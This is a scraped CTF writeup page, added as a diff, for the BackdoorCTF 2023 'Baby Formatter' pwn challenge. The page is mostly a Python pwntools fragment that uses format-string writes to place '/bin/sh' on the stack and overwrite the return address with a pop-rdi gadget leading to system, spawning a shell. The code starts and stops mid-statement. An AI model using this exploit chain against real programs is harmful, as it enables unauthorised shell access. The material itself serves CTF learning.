@@ -1,0 +1,15 @@
+---
+SOURCE: livesearch
+URL: https://ctftime.org/writeup/38350
+CHALLENGE: CTFtime.org / BackdoorCTF 2023 / Pwn/Baby Formatter / Writeup
+EVENT: LiveSearch
+TEAM: N/A
+CATEGORY: other
+DIFFICULTY: Unknown
+PROTECTIONS: None
+KEY_FUNCTIONS: system
+KEY_TECHNIQUE: Writeup for CTFtime.org / BackdoorCTF 2023 / Pwn/Baby Formatter / Writeup — other exploitation technique.
+---
+POP_RDI_OFFSET RET = libc.addr + RET_OFFSET SYSTEM = libc.addr + libc.symbols["system"] # print(f"/bin/sh: {hex(BINSH)}, Main return: {hex(MAIN_RET)}, Pointer to /bin/sh: {hex(BINSH_Location)}") # print(f"Libc base: {hex(libc.addr)}, RET: {hex(RET)}, POP_RDI: {hex(POP_RDI)}, SYSTEM: {hex(SYSTEM)}") # payload = fmtstr_payload(offset, {location : value}) def make_and_send_payload(offset, where, what, size): payload = fmtstr_payload(offset, {where: what}, write_size=size) r.sendlineafter(b">> ", "2") # print(f"Wrote: {what}") r.sendlineafter(b">> ", payload) # write /bin/sh to stack location BINSH print(f"WRITING /bin/sh to {hex(BINSH)}") make_and_send_payload(offset, BINSH, b"/", "byte") make_and_send_payload(offset, BINSH + 1, b"b", "byte") make_and_send_payload(offset, BINSH + 2, b"i", "byte") make_and_send_payload(offset, BINSH + 3, b"n", "byte") make_and_send_payload(offset, BINSH + 4, b"/", "byte") make_and_send_payload(offset, BINSH + 5, b"s", "byte") make_and_send_payload(offset, BINSH + 6, b"h", "byte") make_and_send_payload(offset, BINSH + 7, b"\x00", "byte") # write address of POP_RDI_RET in libc to MAIN_RET on stack print(f"WRITING address of POP_RDI_RET ({hex(POP_RDI)}) on stack at {hex(MAIN_RET)}") make_and_send_payload(offset, MAIN_RET, bytes.fromhex(hex(POP_RDI)[2:])[-1], "byte") make_and_send_payload(offset, MAIN_RET + 1, bytes.fromhex(hex(POP_RDI)[2:])[-2], "byte") make_and_send_payload(offset, MAIN_RET + 2, bytes.fromhex(hex(POP_RDI)[2:])[-3], "byte") make_and_send_payload(offset, MAIN_RET + 3, bytes.fromhex(hex(POP_RDI)[2:])[-4], "byte") make_and_send_payload(offset, MAIN_RET + 4, bytes.fromhex(hex(POP_RDI)[2:])[-5], "byte") make_and_send_payload(offset, MAIN_RET + 5, bytes.fromhex(hex(POP_RDI)[2:])[-6], "byte") # write address of /bin/sh (BINSH) to BINSH_Location on stack print(f"WRITING address of /bin/sh to {hex(BINSH_Location)}") make_and_send_payload(offset, BINSH_Location, bytes.fromhex(hex(BINSH)[2:])[-1], "byte") make_and_send_payload( offse
+
+[Additional Context: This page covers CTFtime.org / BackdoorCTF 2023 / Pwn/Baby Formatter / Writeup in the context of binary exploitation and CTF challenges. Category: other.]
